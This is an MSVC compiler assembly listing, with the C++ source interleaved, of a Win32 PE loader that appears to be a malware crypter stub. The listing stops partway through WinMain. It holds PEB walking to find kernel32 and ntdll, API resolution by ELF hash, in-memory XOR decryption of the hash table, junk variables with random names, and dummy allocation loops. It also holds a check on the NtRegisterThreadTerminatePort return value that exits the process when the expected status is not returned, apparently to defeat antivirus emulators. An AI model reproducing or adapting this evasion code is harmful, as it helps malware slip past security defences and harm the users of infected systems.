	mov	DWORD PTR _addrNames$[ebp], ecx

; 634  : 	WORD* addrNameOrdinals = (WORD*)((DWORD)lpModuleBase + pIED->AddressOfNameOrdinals);

	mov	edx, DWORD PTR _pIED$[ebp]
	mov	eax, DWORD PTR _lpModuleBase$[ebp]
	add	eax, DWORD PTR [edx+36]
	mov	DWORD PTR _addrNameOrdinals$[ebp], eax

; 635  : 
; 636  : 	for (DWORD i = 0; i < pIED->NumberOfNames; i++) {

	mov	DWORD PTR _i$3[ebp], 0
	jmp	SHORT $LN4@load_func
$LN3@load_func:
	mov	ecx, DWORD PTR _i$3[ebp]
	add	ecx, 1
	mov	DWORD PTR _i$3[ebp], ecx
$LN4@load_func:
	mov	edx, DWORD PTR _pIED$[ebp]
	mov	eax, DWORD PTR _i$3[ebp]
	cmp	eax, DWORD PTR [edx+24]
	jae	SHORT $LN2@load_func

; 637  : 
; 638  : 		char* pszFunctionName = (char*)((DWORD)lpModuleBase + (DWORD)addrNames[i]);

	mov	ecx, DWORD PTR _i$3[ebp]
	mov	edx, DWORD PTR _addrNames$[ebp]
	mov	eax, DWORD PTR _lpModuleBase$[ebp]
	add	eax, DWORD PTR [edx+ecx*4]
	mov	DWORD PTR _pszFunctionName$2[ebp], eax

; 639  : 		DWORD elfHash = ELFHash(pszFunctionName, m_strlen(pszFunctionName));

	mov	ecx, DWORD PTR _pszFunctionName$2[ebp]
	push	ecx
	call	?m_strlen@@YAIPBD@Z			; m_strlen
	add	esp, 4
	push	eax
	mov	edx, DWORD PTR _pszFunctionName$2[ebp]
	push	edx
	call	?ELFHash@@YAIPADI@Z			; ELFHash
	add	esp, 8
	mov	DWORD PTR _elfHash$1[ebp], eax

; 640  : 
; 641  : 		if (elfHash == dwFuncHash) {

	mov	eax, DWORD PTR _elfHash$1[ebp]
	cmp	eax, DWORD PTR _dwFuncHash$[ebp]
	jne	SHORT $LN1@load_func

; 642  : 			return (LPVOID)((DWORD)lpModuleBase + (DWORD)addrFunctions[addrNameOrdinals[i]]);

	mov	ecx, DWORD PTR _i$3[ebp]
	mov	edx, DWORD PTR _addrNameOrdinals$[ebp]
	movzx	eax, WORD PTR [edx+ecx*2]
	mov	ecx, DWORD PTR _addrFunctions$[ebp]
	mov	edx, DWORD PTR _lpModuleBase$[ebp]
	add	edx, DWORD PTR [ecx+eax*4]
	mov	eax, edx
	jmp	SHORT $LN9@load_func
$LN1@load_func:

; 643  : 		}
; 644  : 	}

	jmp	SHORT $LN3@load_func
$LN2@load_func:

; 645  : 
; 646  : 	return NULL;

	xor	eax, eax
$LN9@load_func:

; 647  : }

	mov	esp, ebp
	pop	ebp
	ret	0
?load_func@@YAPAXW4MODULE_BASE@@K@Z ENDP		; load_func
_TEXT	ENDS
; Function compile flags: /Odtp
; File c:\users\admin\documents\visual studio 2013\projects\win32project1\win32project1\peloader.h
_TEXT	SEGMENT
_pINH$ = -28						; size = 4
_HashKey$ = -24						; size = 4
_pDataSect$ = -20					; size = 4
_pPEB$ = -16						; size = 4
_pIDH$ = -12						; size = 4
_currentImageBase$ = -8					; size = 4
_addrHashes$ = -4					; size = 4
?decrypt_hashes@@YAXXZ PROC				; decrypt_hashes

; 594  : VOID decrypt_hashes() {

	push	ebp
	mov	ebp, esp
	sub	esp, 28					; 0000001cH

; 595  : 
; 596  : 	PPEB pPEB = (PPEB)__readfsdword(0x30);

	mov	eax, DWORD PTR fs:48
	mov	DWORD PTR _pPEB$[ebp], eax

; 597  : 	LPVOID currentImageBase = pPEB->ImageBaseAddress;

	mov	ecx, DWORD PTR _pPEB$[ebp]
	mov	edx, DWORD PTR [ecx+8]
	mov	DWORD PTR _currentImageBase$[ebp], edx

; 598  : 
; 599  : 	PIMAGE_DOS_HEADER pIDH = (PIMAGE_DOS_HEADER)currentImageBase;

	mov	eax, DWORD PTR _currentImageBase$[ebp]
	mov	DWORD PTR _pIDH$[ebp], eax

; 600  : 	PIMAGE_NT_HEADERS pINH = (PIMAGE_NT_HEADERS)((DWORD)currentImageBase + pIDH->e_lfanew);

	mov	ecx, DWORD PTR _pIDH$[ebp]
	mov	edx, DWORD PTR _currentImageBase$[ebp]
	add	edx, DWORD PTR [ecx+60]
	mov	DWORD PTR _pINH$[ebp], edx

; 601  : 	PIMAGE_SECTION_HEADER pDataSect = (PIMAGE_SECTION_HEADER)((DWORD)currentImageBase + pIDH->e_lfanew + 0xF8 + (2 * 0x28));

	mov	eax, DWORD PTR _pIDH$[ebp]
	mov	ecx, DWORD PTR [eax+60]
	mov	edx, DWORD PTR _currentImageBase$[ebp]
	lea	eax, DWORD PTR [edx+ecx+328]
	mov	DWORD PTR _pDataSect$[ebp], eax

; 602  : 
; 603  : 	// Decrypt hashes in memory
; 604  : 	DWORD* addrHashes = (DWORD*)((DWORD)currentImageBase + pDataSect->VirtualAddress + KEY_SIZE + sizeof(Settings));

	mov	ecx, DWORD PTR _pDataSect$[ebp]
	mov	edx, DWORD PTR [ecx+12]
	mov	eax, DWORD PTR _currentImageBase$[ebp]
	lea	ecx, DWORD PTR [eax+edx+260]
	mov	DWORD PTR _addrHashes$[ebp], ecx

; 605  : 
; 606  : 	DWORD HashKey = *addrHashes;

	mov	edx, DWORD PTR _addrHashes$[ebp]
	mov	eax, DWORD PTR [edx]
	mov	DWORD PTR _HashKey$[ebp], eax

; 607  : 	addrHashes = (DWORD*)addrHashes++;

	mov	ecx, DWORD PTR _addrHashes$[ebp]
	mov	DWORD PTR _addrHashes$[ebp], ecx
	mov	edx, DWORD PTR _addrHashes$[ebp]
	add	edx, 4
	mov	DWORD PTR _addrHashes$[ebp], edx
$LN2@decrypt_ha:

; 608  : 
; 609  : 	while ((DWORD)*addrHashes != 0xDEADC0DE) {

	mov	eax, DWORD PTR _addrHashes$[ebp]
	cmp	DWORD PTR [eax], -559038242		; deadc0deH
	je	SHORT $LN3@decrypt_ha

; 610  : 		(*addrHashes++) ^= HashKey;

	mov	ecx, DWORD PTR _addrHashes$[ebp]
	mov	edx, DWORD PTR [ecx]
	xor	edx, DWORD PTR _HashKey$[ebp]
	mov	eax, DWORD PTR _addrHashes$[ebp]
	mov	DWORD PTR [eax], edx
	mov	ecx, DWORD PTR _addrHashes$[ebp]
	add	ecx, 4
	mov	DWORD PTR _addrHashes$[ebp], ecx

; 611  : 	}

	jmp	SHORT $LN2@decrypt_ha
$LN3@decrypt_ha:

; 612  : }

	mov	esp, ebp
	pop	ebp
	ret	0
?decrypt_hashes@@YAXXZ ENDP				; decrypt_hashes
_TEXT	ENDS
; Function compile flags: /Odtp
; File c:\users\admin\documents\visual studio 2013\projects\win32project1\win32project1\peloader.h
_TEXT	SEGMENT
_pINH$ = -20						; size = 4
_pDataSect$ = -16					; size = 4
_pPEB$ = -12						; size = 4
_pIDH$ = -8						; size = 4
_currentImageBase$ = -4					; size = 4
?init_settings@@YAXXZ PROC				; init_settings

; 582  : VOID init_settings() {

	push	ebp
	mov	ebp, esp
	sub	esp, 20					; 00000014H

; 583  : 
; 584  : 	PPEB pPEB = (PPEB)__readfsdword(0x30);

	mov	eax, DWORD PTR fs:48
	mov	DWORD PTR _pPEB$[ebp], eax

; 585  : 	LPVOID currentImageBase = pPEB->ImageBaseAddress;

	mov	ecx, DWORD PTR _pPEB$[ebp]
	mov	edx, DWORD PTR [ecx+8]
	mov	DWORD PTR _currentImageBase$[ebp], edx

; 586  : 
; 587  : 	PIMAGE_DOS_HEADER pIDH = (PIMAGE_DOS_HEADER)currentImageBase;

	mov	eax, DWORD PTR _currentImageBase$[ebp]
	mov	DWORD PTR _pIDH$[ebp], eax

; 588  : 	PIMAGE_NT_HEADERS pINH = (PIMAGE_NT_HEADERS)((DWORD)currentImageBase + pIDH->e_lfanew);

	mov	ecx, DWORD PTR _pIDH$[ebp]
	mov	edx, DWORD PTR _currentImageBase$[ebp]
	add	edx, DWORD PTR [ecx+60]
	mov	DWORD PTR _pINH$[ebp], edx

; 589  : 	PIMAGE_SECTION_HEADER pDataSect = (PIMAGE_SECTION_HEADER)((DWORD)currentImageBase + pIDH->e_lfanew + 0xF8 + (2 * 0x28));

	mov	eax, DWORD PTR _pIDH$[ebp]
	mov	ecx, DWORD PTR [eax+60]
	mov	edx, DWORD PTR _currentImageBase$[ebp]
	lea	eax, DWORD PTR [edx+ecx+328]
	mov	DWORD PTR _pDataSect$[ebp], eax

; 590  : 
; 591  : 	pSettings = (Settings*)((DWORD)currentImageBase + pDataSect->VirtualAddress + KEY_SIZE);

	mov	ecx, DWORD PTR _pDataSect$[ebp]
	mov	edx, DWORD PTR [ecx+12]
	mov	eax, DWORD PTR _currentImageBase$[ebp]
	lea	ecx, DWORD PTR [eax+edx+256]
	mov	DWORD PTR ?pSettings@@3PAUSettings@@A, ecx ; pSettings

; 592  : }

	mov	esp, ebp
	pop	ebp
	ret	0
?init_settings@@YAXXZ ENDP				; init_settings
_TEXT	ENDS
; Function compile flags: /Odtp
; File c:\users\admin\documents\visual studio 2013\projects\win32project1\win32project1\peloader.h
_TEXT	SEGMENT
_str1$ = 8						; size = 4
_str2$ = 12						; size = 4
?m_strcmp@@YAHPBD0@Z PROC				; m_strcmp

; 574  : 			 const TCHAR * str2) {

	push	ebp
	mov	ebp, esp
$LN2@m_strcmp:

; 575  : 	while (*str1 && *str1 == *str2) {

	mov	eax, DWORD PTR _str1$[ebp]
	movsx	ecx, BYTE PTR [eax]
	test	ecx, ecx
	je	SHORT $LN1@m_strcmp
	mov	edx, DWORD PTR _str1$[ebp]
	movsx	eax, BYTE PTR [edx]
	mov	ecx, DWORD PTR _str2$[ebp]
	movsx	edx, BYTE PTR [ecx]
	cmp	eax, edx
	jne	SHORT $LN1@m_strcmp

; 576  : 		++str1;

	mov	eax, DWORD PTR _str1$[ebp]
	add	eax, 1
	mov	DWORD PTR _str1$[ebp], eax

; 577  : 		++str2;

	mov	ecx, DWORD PTR _str2$[ebp]
	add	ecx, 1
	mov	DWORD PTR _str2$[ebp], ecx

; 578  : 	}

	jmp	SHORT $LN2@m_strcmp
$LN1@m_strcmp:

; 579  : 	return *str1 - *str2;

	mov	edx, DWORD PTR _str1$[ebp]
	movsx	eax, BYTE PTR [edx]
	mov	ecx, DWORD PTR _str2$[ebp]
	movsx	edx, BYTE PTR [ecx]
	sub	eax, edx

; 580  : }

	pop	ebp
	ret	0
?m_strcmp@@YAHPBD0@Z ENDP				; m_strcmp
_TEXT	ENDS
; Function compile flags: /Odtp
; File c:\users\admin\documents\visual studio 2013\projects\win32project1\win32project1\peloader.h
_TEXT	SEGMENT
_start$ = -4						; size = 4
_str$ = 8						; size = 4
?m_strlen@@YAIPBD@Z PROC				; m_strlen

; 567  : size_t m_strlen(const TCHAR* str) {

	push	ebp
	mov	ebp, esp
	push	ecx

; 568  : 	const TCHAR * start = str;

	mov	eax, DWORD PTR _str$[ebp]
	mov	DWORD PTR _start$[ebp], eax
$LN2@m_strlen:

; 569  : 	while (*str) ++str;

	mov	ecx, DWORD PTR _str$[ebp]
	movsx	edx, BYTE PTR [ecx]
	test	edx, edx
	je	SHORT $LN1@m_strlen
	mov	eax, DWORD PTR _str$[ebp]
	add	eax, 1
	mov	DWORD PTR _str$[ebp], eax
	jmp	SHORT $LN2@m_strlen
$LN1@m_strlen:

; 570  : 	return str - start;

	mov	eax, DWORD PTR _str$[ebp]
	sub	eax, DWORD PTR _start$[ebp]

; 571  : }

	mov	esp, ebp
	pop	ebp
	ret	0
?m_strlen@@YAIPBD@Z ENDP				; m_strlen
_TEXT	ENDS
; Function compile flags: /Odtp
; File c:\users\admin\documents\visual studio 2013\projects\win32project1\win32project1\peloader.h
_TEXT	SEGMENT
_Str$1 = -8						; size = 4
_Buf$2 = -4						; size = 4
_szBuf$ = 8						; size = 4
_szStr$ = 12						; size = 4
_nLen$ = 16						; size = 4
?m_memcpy@@YAPAXPAXPBXH@Z PROC				; m_memcpy

; 553  : void* m_memcpy(void *szBuf, const void *szStr, int nLen) {

	push	ebp
	mov	ebp, esp
	sub	esp, 8

; 554  : 	if (szBuf && szStr) {

	cmp	DWORD PTR _szBuf$[ebp], 0
	je	SHORT $LN3@m_memcpy
	cmp	DWORD PTR _szStr$[ebp], 0
	je	SHORT $LN3@m_memcpy

; 555  : 		volatile char *Buf = (volatile char *)szBuf;

	mov	eax, DWORD PTR _szBuf$[ebp]
	mov	DWORD PTR _Buf$2[ebp], eax

; 556  : 		volatile char *Str = (volatile char *)szStr;

	mov	ecx, DWORD PTR _szStr$[ebp]
	mov	DWORD PTR _Str$1[ebp], ecx
$LN2@m_memcpy:

; 557  : 		while (nLen) {

	cmp	DWORD PTR _nLen$[ebp], 0
	je	SHORT $LN3@m_memcpy

; 558  : 			nLen--;

	mov	edx, DWORD PTR _nLen$[ebp]
	sub	edx, 1
	mov	DWORD PTR _nLen$[ebp], edx

; 559  : 			*Buf = *Str;

	mov	eax, DWORD PTR _Buf$2[ebp]
	mov	ecx, DWORD PTR _Str$1[ebp]
	mov	dl, BYTE PTR [ecx]
	mov	BYTE PTR [eax], dl

; 560  : 			Buf++;

	mov	eax, DWORD PTR _Buf$2[ebp]
	add	eax, 1
	mov	DWORD PTR _Buf$2[ebp], eax

; 561  : 			Str++;

	mov	ecx, DWORD PTR _Str$1[ebp]
	add	ecx, 1
	mov	DWORD PTR _Str$1[ebp], ecx

; 562  : 		}

	jmp	SHORT $LN2@m_memcpy
$LN3@m_memcpy:

; 563  : 	}
; 564  : 	return szBuf;

	mov	eax, DWORD PTR _szBuf$[ebp]

; 565  : }

	mov	esp, ebp
	pop	ebp
	ret	0
?m_memcpy@@YAPAXPAXPBXH@Z ENDP				; m_memcpy
_TEXT	ENDS
; Function compile flags: /Odtp
; File c:\users\admin\documents\visual studio 2013\projects\win32project1\win32project1\peloader.h
_TEXT	SEGMENT
_x$ = -12						; size = 4
_i$ = -8						; size = 4
_hash$ = -4						; size = 4
_str$ = 8						; size = 4
_len$ = 12						; size = 4
?ELFHash@@YAIPADI@Z PROC				; ELFHash

; 537  : unsigned int ELFHash(char* str, unsigned int len) {

	push	ebp
	mov	ebp, esp
	sub	esp, 12					; 0000000cH

; 538  : 	unsigned int hash = 0;

	mov	DWORD PTR _hash$[ebp], 0

; 539  : 	unsigned int x = 0;

	mov	DWORD PTR _x$[ebp], 0

; 540  : 	unsigned int i = 0;

	mov	DWORD PTR _i$[ebp], 0

; 541  : 
; 542  : 	for (i = 0; i < len; str++, i++) {

	mov	DWORD PTR _i$[ebp], 0
	jmp	SHORT $LN4@ELFHash
$LN3@ELFHash:
	mov	eax, DWORD PTR _str$[ebp]
	add	eax, 1
	mov	DWORD PTR _str$[ebp], eax
	mov	ecx, DWORD PTR _i$[ebp]
	add	ecx, 1
	mov	DWORD PTR _i$[ebp], ecx
$LN4@ELFHash:
	mov	edx, DWORD PTR _i$[ebp]
	cmp	edx, DWORD PTR _len$[ebp]
	jae	SHORT $LN2@ELFHash

; 543  : 		hash = (hash << 4) + (*str);

	mov	eax, DWORD PTR _hash$[ebp]
	shl	eax, 4
	mov	ecx, DWORD PTR _str$[ebp]
	movsx	edx, BYTE PTR [ecx]
	add	eax, edx
	mov	DWORD PTR _hash$[ebp], eax

; 544  : 		if ((x = hash & 0xF0000000L) != 0) {

	mov	eax, DWORD PTR _hash$[ebp]
	and	eax, -268435456				; f0000000H
	mov	DWORD PTR _x$[ebp], eax
	je	SHORT $LN1@ELFHash

; 545  : 			hash ^= (x >> 24);

	mov	ecx, DWORD PTR _x$[ebp]
	shr	ecx, 24					; 00000018H
	xor	ecx, DWORD PTR _hash$[ebp]
	mov	DWORD PTR _hash$[ebp], ecx
$LN1@ELFHash:

; 546  : 		}
; 547  : 		hash &= ~x;

	mov	edx, DWORD PTR _x$[ebp]
	not	edx
	and	edx, DWORD PTR _hash$[ebp]
	mov	DWORD PTR _hash$[ebp], edx

; 548  : 	}

	jmp	SHORT $LN3@ELFHash
$LN2@ELFHash:

; 549  : 
; 550  : 	return hash;

	mov	eax, DWORD PTR _hash$[ebp]

; 551  : }

	mov	esp, ebp
	pop	ebp
	ret	0
?ELFHash@@YAIPADI@Z ENDP				; ELFHash
_TEXT	ENDS
; Function compile flags: /Odtp
; File c:\users\admin\documents\visual studio 2013\projects\win32project1\win32project1\peloader.h
_TEXT	SEGMENT
_pPEB$ = -12						; size = 4
tv67 = -8						; size = 4
_lpNtdll$ = -4						; size = 4
?load_ntdll@@YA_NXZ PROC				; load_ntdll

; 520  : bool load_ntdll() {

	push	ebp
	mov	ebp, esp
	sub	esp, 12					; 0000000cH

; 521  : 
; 522  : 	LPVOID lpNtdll = NULL;

	mov	DWORD PTR _lpNtdll$[ebp], 0

; 523  : 	LPVOID pPEB = (LPVOID)__readfsdword(0x30);

	mov	eax, DWORD PTR fs:48
	mov	DWORD PTR _pPEB$[ebp], eax

; 524  : 	__asm {
; 525  : 		mov eax, pPEB

	mov	eax, DWORD PTR _pPEB$[ebp]

; 526  : 			mov eax, [eax + 0x0c]

	mov	eax, DWORD PTR [eax+12]

; 527  : 			mov eax, [eax + 0x14]

	mov	eax, DWORD PTR [eax+20]

; 528  : 			mov eax, [eax]

	mov	eax, DWORD PTR [eax]

; 529  : 			mov eax, [eax + 0x10]

	mov	eax, DWORD PTR [eax+16]

; 530  : 			mov lpNtdll, eax

	mov	DWORD PTR _lpNtdll$[ebp], eax

; 531  : 	}
; 532  : 	NTDLL_BASE_ADDRESS = lpNtdll;

	mov	ecx, DWORD PTR _lpNtdll$[ebp]
	mov	DWORD PTR ?NTDLL_BASE_ADDRESS@@3PAXA, ecx ; NTDLL_BASE_ADDRESS

; 533  : 	return lpNtdll != NULL;

	cmp	DWORD PTR _lpNtdll$[ebp], 0
	je	SHORT $LN3@load_ntdll
	mov	DWORD PTR tv67[ebp], 1
	jmp	SHORT $LN4@load_ntdll
$LN3@load_ntdll:
	mov	DWORD PTR tv67[ebp], 0
$LN4@load_ntdll:
	mov	al, BYTE PTR tv67[ebp]

; 534  : }

	mov	esp, ebp
	pop	ebp
	ret	0
?load_ntdll@@YA_NXZ ENDP				; load_ntdll
_TEXT	ENDS
; Function compile flags: /Odtp
; File c:\users\admin\documents\visual studio 2013\projects\win32project1\win32project1\peloader.h
_TEXT	SEGMENT
_pPEB$ = -12						; size = 4
tv67 = -8						; size = 4
_lpKernel32$ = -4					; size = 4
?load_kernel32@@YA_NXZ PROC				; load_kernel32

; 503  : bool load_kernel32() {

	push	ebp
	mov	ebp, esp
	sub	esp, 12					; 0000000cH

; 504  : 
; 505  : 	LPVOID lpKernel32 = NULL;

	mov	DWORD PTR _lpKernel32$[ebp], 0

; 506  : 	LPVOID pPEB = (LPVOID)__readfsdword(0x30);

	mov	eax, DWORD PTR fs:48
	mov	DWORD PTR _pPEB$[ebp], eax

; 507  : 	__asm {
; 508  : 		mov eax, pPEB

	mov	eax, DWORD PTR _pPEB$[ebp]

; 509  : 			mov eax, [eax + 0x0c]

	mov	eax, DWORD PTR [eax+12]

; 510  : 			mov eax, [eax + 0x14]

	mov	eax, DWORD PTR [eax+20]

; 511  : 			mov eax, [eax]

	mov	eax, DWORD PTR [eax]

; 512  : 			mov eax, [eax]

	mov	eax, DWORD PTR [eax]

; 513  : 			mov eax, [eax + 0x10]

	mov	eax, DWORD PTR [eax+16]

; 514  : 			mov lpKernel32, eax

	mov	DWORD PTR _lpKernel32$[ebp], eax

; 515  : 	}
; 516  : 	KERNEL32_BASE_ADDRESS = lpKernel32;

	mov	ecx, DWORD PTR _lpKernel32$[ebp]
	mov	DWORD PTR ?KERNEL32_BASE_ADDRESS@@3PAXA, ecx ; KERNEL32_BASE_ADDRESS

; 517  : 	return lpKernel32 != NULL;

	cmp	DWORD PTR _lpKernel32$[ebp], 0
	je	SHORT $LN3@load_kerne
	mov	DWORD PTR tv67[ebp], 1
	jmp	SHORT $LN4@load_kerne
$LN3@load_kerne:
	mov	DWORD PTR tv67[ebp], 0
$LN4@load_kerne:
	mov	al, BYTE PTR tv67[ebp]

; 518  : }

	mov	esp, ebp
	pop	ebp
	ret	0
?load_kernel32@@YA_NXZ ENDP				; load_kernel32
_TEXT	ENDS
; Function compile flags: /Odtp
; File c:\users\admin\documents\visual studio 2013\projects\win32project1\win32project1\win32project1.cpp
_TEXT	SEGMENT
_msg$ = -128						; size = 28
_ogouTSTrbQq$ = -100					; size = 4
_OHVjjuW$ = -96						; size = 4
_UKmgRgu$ = -92						; size = 4
_TKUbvrYAqW$ = -88					; size = 4
_xvndX$ = -84						; size = 4
_KBTsmSEcnnd$ = -80					; size = 4
_zHiEMQYhaZa$ = -76					; size = 4
_tFgJ$ = -72						; size = 4
_smqH$ = -68						; size = 4
_YDnnlzWsPrY$ = -64					; size = 4
_hAccelTable$ = -60					; size = 4
_lpExeBuffer$ = -56					; size = 4
_dwExeSize$ = -52					; size = 4
_eCOvAWndzGE$ = -48					; size = 4
_tcoGxIxPUl$ = -44					; size = 4
_lpIsWalpha$1 = -40					; size = 4
_lpNtRegisterThreadTerminatePort$2 = -36		; size = 4
_lhoN$ = -32						; size = 4
_cHxOcRNyfwW$ = -28					; size = 4
_eax_value$3 = -24					; size = 4
_lpExitProcess$4 = -20					; size = 4
_i$5 = -16						; size = 4
_ecx_value$6 = -12					; size = 4
_x$7 = -8						; size = 4
_i$8 = -4						; size = 4
_hInstance$ = 8						; size = 4
_hPrevInstance$ = 12					; size = 4
_lpCmdLine$ = 16					; size = 4
_nCmdShow$ = 20						; size = 4
_WinMain@16 PROC

; 348  : 					   _In_ int       nCmdShow) {

	push	ebp
	mov	ebp, esp
	sub	esp, 128				; 00000080H

; 349  : 	UNREFERENCED_PARAMETER(hPrevInstance);
; 350  : 	UNREFERENCED_PARAMETER(lpCmdLine);
; 351  : 
; 352  : 	// TODO: Place code here.
; 353  : 	MSG msg;
; 354  : 	HACCEL hAccelTable;
; 355  : 	LPVOID lpExeBuffer;
; 356  : 	DWORD dwExeSize;
; 357  : 
; 358  : 	// Initialize global strings
; 359  : 	LoadString(hInstance, IDS_APP_TITLE, szTitle, MAX_LOADSTRING);

	push	100					; 00000064H
	push	OFFSET ?szTitle@@3PADA			; szTitle
	push	103					; 00000067H
	mov	eax, DWORD PTR _hInstance$[ebp]
	push	eax
	call	DWORD PTR __imp__LoadStringA@16

; 360  : 	LoadString(hInstance, IDC_WIN32PROJECT1, szWindowClass, MAX_LOADSTRING);

	push	100					; 00000064H
	push	OFFSET ?szWindowClass@@3PADA		; szWindowClass
	push	109					; 0000006dH
	mov	ecx, DWORD PTR _hInstance$[ebp]
	push	ecx
	call	DWORD PTR __imp__LoadStringA@16

; 361  : 	MyRegisterClass(hInstance);

	mov	edx, DWORD PTR _hInstance$[ebp]
	push	edx
	call	?MyRegisterClass@@YAGPAUHINSTANCE__@@@Z	; MyRegisterClass
	add	esp, 4

; 362  : 
; 363  : 	HDC cHxOcRNyfwW = (HDC)0x7E328BC8;

	mov	DWORD PTR _cHxOcRNyfwW$[ebp], 2117241800 ; 7e328bc8H

; 364  : 	PLONG YDnnlzWsPrY = (PLONG)0x52A54056;

	mov	DWORD PTR _YDnnlzWsPrY$[ebp], 1386561622 ; 52a54056H

; 365  : 	HMENU smqH = (HMENU)0x20CFDFBF;

	mov	DWORD PTR _smqH$[ebp], 550494143	; 20cfdfbfH

; 366  : 	PVOID tFgJ = (PVOID)0x1A86350D;

	mov	DWORD PTR _tFgJ$[ebp], 445003021	; 1a86350dH

; 367  : 	HINSTANCE eCOvAWndzGE = (HINSTANCE)0x05B1068D;

	mov	DWORD PTR _eCOvAWndzGE$[ebp], 95487629	; 05b1068dH

; 368  : 	PWCHAR zHiEMQYhaZa = (PWCHAR)L"cpYH0";

	mov	DWORD PTR _zHiEMQYhaZa$[ebp], OFFSET $SG53523

; 369  : 	HWND tcoGxIxPUl = (HWND)0x09311D7E;

	mov	DWORD PTR _tcoGxIxPUl$[ebp], 154213758	; 09311d7eH

; 370  : 	LONG lhoN = (LONG)0x22CAB0EC;

	mov	DWORD PTR _lhoN$[ebp], 583708908	; 22cab0ecH

; 371  : 	PCHAR KBTsmSEcnnd = (PCHAR)"WcJRNeG1Mf";

	mov	DWORD PTR _KBTsmSEcnnd$[ebp], OFFSET $SG53530

; 372  : 	BOOL xvndX = (BOOL)TRUE;

	mov	DWORD PTR _xvndX$[ebp], 1

; 373  : 	HMODULE TKUbvrYAqW = (HMODULE)0x05415905;

	mov	DWORD PTR _TKUbvrYAqW$[ebp], 88168709	; 05415905H

; 374  : 	PDWORD UKmgRgu = (PDWORD)0x381325DA;

	mov	DWORD PTR _UKmgRgu$[ebp], 940778970	; 381325daH

; 375  : 	DWORD OHVjjuW = (DWORD)0x785F80AF;

	mov	DWORD PTR _OHVjjuW$[ebp], 2019524783	; 785f80afH

; 376  : 	HANDLE ogouTSTrbQq = (HANDLE)0x18D574EE;

	mov	DWORD PTR _ogouTSTrbQq$[ebp], 416642286	; 18d574eeH

; 377  : 
; 378  : 	//call_test();
; 379  : 	//ExitProcess(0);
; 380  : 
; 381  : 	for (size_t i = 0; i < 5000; i++) {

	mov	DWORD PTR _i$8[ebp], 0
	jmp	SHORT $LN19@WinMain
$LN18@WinMain:
	mov	eax, DWORD PTR _i$8[ebp]
	add	eax, 1
	mov	DWORD PTR _i$8[ebp], eax
$LN19@WinMain:
	cmp	DWORD PTR _i$8[ebp], 5000		; 00001388H
	jae	SHORT $LN17@WinMain

; 382  : 
; 383  : 		//__asm{ pushad }
; 384  : //		emul_func_loop();
; 385  : 		//__asm { popad }
; 386  : 
; 387  : 		VirtualFree(0, 0, 0);

	push	0
	push	0
	push	0
	call	DWORD PTR __imp__VirtualFree@12

; 388  : 
; 389  : 		for (size_t x = 0; x < 250; x++) {

	mov	DWORD PTR _x$7[ebp], 0
	jmp	SHORT $LN16@WinMain
$LN15@WinMain:
	mov	ecx, DWORD PTR _x$7[ebp]
	add	ecx, 1
	mov	DWORD PTR _x$7[ebp], ecx
$LN16@WinMain:
	cmp	DWORD PTR _x$7[ebp], 250		; 000000faH
	jae	SHORT $LN14@WinMain

; 390  : 
; 391  : 			VirtualAlloc(0, 0, 0, 0);

	push	0
	push	0
	push	0
	push	0
	call	DWORD PTR __imp__VirtualAlloc@16

; 392  : 
; 393  : 			//__asm{ pushad }
; 394  : 			//emul_func_loop();
; 395  : 			//__asm { popad }
; 396  : 
; 397  : 		}

	jmp	SHORT $LN15@WinMain
$LN14@WinMain:

; 398  : 	}

	jmp	SHORT $LN18@WinMain
$LN17@WinMain:

; 399  : 
; 400  : 	init_settings();

	call	?init_settings@@YAXXZ			; init_settings

; 401  : 	decrypt_hashes();

	call	?decrypt_hashes@@YAXXZ			; decrypt_hashes

; 402  : 
; 403  : 	if (loader_init()) {

	call	?loader_init@@YA_NXZ			; loader_init
	movzx	edx, al
	test	edx, edx
	je	$LN13@WinMain

; 404  : 
; 405  : 		LPVOID lpNtRegisterThreadTerminatePort = load_func(MODULE_BASE::NTDLL, hash_NtRegisterThreadTerminatePort);

	mov	eax, DWORD PTR ?hash_NtRegisterThreadTerminatePort@@3KC ; hash_NtRegisterThreadTerminatePort
	push	eax
	push	0
	call	?load_func@@YAPAXW4MODULE_BASE@@K@Z	; load_func
	add	esp, 8
	mov	DWORD PTR _lpNtRegisterThreadTerminatePort$2[ebp], eax

; 406  : 		DWORD eax_value = 0;

	mov	DWORD PTR _eax_value$3[ebp], 0

; 407  : 
; 408  : 		LPVOID lpExitProcess = load_func(MODULE_BASE::KERNEL32, hash_ExitProcess);

	mov	ecx, DWORD PTR ?hash_ExitProcess@@3KC	; hash_ExitProcess
	push	ecx
	push	1
	call	?load_func@@YAPAXW4MODULE_BASE@@K@Z	; load_func
	add	esp, 8
	mov	DWORD PTR _lpExitProcess$4[ebp], eax

; 409  : 
; 410  : 		__asm{
; 411  : 			push 0x5239182

	push	86217090				; 05239182H

; 412  : 				mov eax, lpNtRegisterThreadTerminatePort

	mov	eax, DWORD PTR _lpNtRegisterThreadTerminatePort$2[ebp]

; 413  : 				call eax

	call	eax

; 414  : 				mov eax_value, eax

	mov	DWORD PTR _eax_value$3[ebp], eax

; 415  : 		}
; 416  : 
; 417  : 		if (eax_value != 0xC0000008) {

	cmp	DWORD PTR _eax_value$3[ebp], -1073741816 ; c0000008H
	je	SHORT $LN12@WinMain

; 418  : 			
; 419  : 			OleInitialize(nullptr);

	push	0
	call	DWORD PTR __imp__OleInitialize@4

; 420  : 
; 421  : 			__asm{
; 422  : 				push 0xc8

	push	200					; 000000c8H

; 423  : 					mov eax, lpExitProcess

	mov	eax, DWORD PTR _lpExitProcess$4[ebp]

; 424  : 					call eax

	call	eax
$LN12@WinMain:

; 425  : 			}
; 426  : 		}
; 427  : 
; 428  : 		LPVOID lpIsWalpha = load_func(MODULE_BASE::NTDLL, hash_iswalpha);

	mov	edx, DWORD PTR ?hash_iswalpha@@3KC	; hash_iswalpha
	push	edx
	push	0
	call	?load_func@@YAPAXW4MODULE_BASE@@K@Z	; load_func
	add	esp, 8
	mov	DWORD PTR _lpIsWalpha$1[ebp], eax

; 429  : 		DWORD ecx_value = 0;

	mov	DWORD PTR _ecx_value$6[ebp], 0

; 430  : 
; 431  : 		func_1_1((HDC)0x25FA9F4A, lhoN);

	mov	eax, DWORD PTR _lhoN$[ebp]
	push	eax
	push	637181770				; 25fa9f4aH
	call	?func_1_1@@YAPAUHMENU__@@PAUHDC__@@J@Z	; func_1_1
	add	esp, 8

; 432  : 
; 433  : 		__asm	{
; 434  : 			push 0xAA4D83

	push	11160963				; 00aa4d83H

; 435  : 				mov eax, lpIsWalpha

	mov	eax, DWORD PTR _lpIsWalpha$1[ebp]

; 436  : 				call eax

	call	eax

; 437  : 				mov ecx_value, ecx

